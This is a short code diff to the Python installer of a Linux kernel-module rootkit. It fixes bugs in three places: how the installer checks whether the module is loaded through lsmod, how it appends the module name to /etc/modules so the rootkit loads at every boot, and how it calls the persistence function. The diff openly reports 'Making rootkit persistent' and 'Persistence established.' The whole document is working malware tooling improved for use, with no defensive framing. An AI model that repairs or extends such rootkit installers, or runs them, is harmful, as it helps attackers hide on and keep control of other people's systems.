@@ -141,8 +141,8 @@ def is_module_already_loaded(module_name):
 	"""
 	Returns True if module_name appears in output of $ lsmod
 	"""
-	output = run_cmd("lsmod")[0]
-	modules = [line.split()[0] for line in output]
+	output = run_cmd("lsmod")[0].decode("utf-8")
+	modules = [line.split()[0] for line in output.split()]
 	return module_name in modules
 
 
@@ -181,7 +181,7 @@ def enable_persistence(module_name):
 	print_status("Making rootkit persistent...")
 	if not is_module_already_persistent(module_name):
 		with open("/etc/modules", "a") as f:
-			f.write(module_name)
+			f.write(module_name + "\n")
 		print_success("Persistence established.")
 
 
@@ -261,7 +261,7 @@ def install(kernel_version):
 
 	# Option to enable persistence by making the module load on boot.
 	if prompt_yes_no("Enable persistence?"):
-		enable_persistence()
+		enable_persistence(config["MODULE_NAME"])
 
 	run_cmd_exit_on_fail("depmod")
 	# Unload kernel module if it's already loaded.
